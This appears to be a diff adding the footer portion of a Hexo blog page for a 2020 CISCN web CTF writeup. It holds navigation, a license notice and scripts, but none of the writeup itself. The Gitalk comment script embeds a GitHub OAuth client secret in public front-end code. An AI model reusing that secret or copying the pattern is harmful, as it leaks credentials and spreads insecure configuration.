+          <a href="/2020/08/21/2020ciscn-web题目writeup/" target="_blank" title="2020ciscn-web题目writeup">http://mount4in.github.io/2020/08/21/2020ciscn-web题目writeup/</a>
+          </li>
+          <li class="post-copyright-license">
+            <strong>版权声明:   </strong>
+            本网站所有文章除特别声明外,均采用 <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
+            许可协议。转载请注明出处!
+          </li>
+        </ul>
+      <div>
+
+  
+  <!---->
+    <footer class="article-footer">
+      <a data-url="http://mount4in.github.io/2020/08/21/2020ciscn-web%E9%A2%98%E7%9B%AEwriteup/" data-id="clg20p5ua001214uvfng3bmwh"
+         class="article-share-link">Share</a>
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li></ul>
+
+    </footer>
+
+
+
+  
+    
+  <nav class="article-nav">
+    
+      <a href="/2020/08/24/2020%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/" class="article-nav-link">
+        <strong class="article-nav-caption">Newer</strong>
+        <div class="article-nav-title">
+          
+            2020强网杯部分题目writeup
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2020/08/08/2020WMCTF-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" class="article-nav-link">
+        <strong class="article-nav-caption">Older</strong>
+        <div class="article-nav-title">2020WMCTF-WEB题目复现</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+
+  
+    
+  <div class="gitalk" id="gitalk-container"></div>
+  
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+
+  
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+  
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+
+  <script type="text/javascript">
+    var gitalk = new Gitalk({
+      clientID: 'b7d32ae2538e1a71f462',
+      clientSecret: 'da0452b610458a4ccbc38598fb0d02f0eb9e653d',
+      repo: 'gitalk',
+      owner: 'Mount4in',
+      admin: ['Mount4in'],
+      // id: location.pathname,      // Ensure uniqueness and length less than 50
+      id: md5(location.pathname),
+      distractionFreeMode: false,  // Facebook-like distraction free mode
+      pagerDirection: 'last'
+    })
+
+  gitalk.render('gitalk-container')
+  </script>
+
+  
+
+</article>
+
+
+
+</section>
+  <footer class="footer">
+  <div class="outer">
+    <div class="float-right">
+      <ul class="list-inline">
+  
+    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
+  
+    <li><i class="fe fe-bookmark"></i> <span id="busuanzi_value_page_pv"></span></li>
+  
+</ul>
+    </div>
+    <ul class="list-inline">
+      <li>&copy; 2023 Mount4in</li>
+      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
+      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean" target="_blank" rel="noopener">Ocean</a></li>
+    </ul>
+  </div>
+</footer>
+
+</main>
+<aside class="sidebar">
+  <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+    <div class="logo">
+      <a href="/"><img src="/images/hexo.svg" alt="Mount4in"></a>
+    </div>
+  
+  <ul class="nav nav-main">
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/">Home</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/archives">Archives</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/about">About</a>
+      </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link nav-item-search" title="Search">
+        <i class="fe fe-search"></i>
+        Search
+      </a>
+    </li>
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      <div class="totop" id="totop">
+  <i class="fe fe-rocket"></i>
+</div>
+    </li>
+    <li class="nav-item">
+      
+        <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+          <i class="fe fe-feed"></i>
+        </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+</aside>
+
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+  
+<script src="/js/tocbot.min.js"></script>
+
+  <script>
+    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+    tocbot.init({
+      tocSelector: '.tocbot',
+      contentSelector: '.article-entry',
+      headingSelector: 'h1, h2, h3, h4, h5, h6',
+      hasInnerContainers: true,
+      scrollSmooth: true,
+      positionFixedSelector: '.tocbot',
+      positionFixedClass: 'is-position-fixed',
+      fixedSidebarOffset: 'auto',
+    });
+  </script>
+
+
+
+<script src="/js/ocean.js"></script>
+
+
+</body>
+</html>
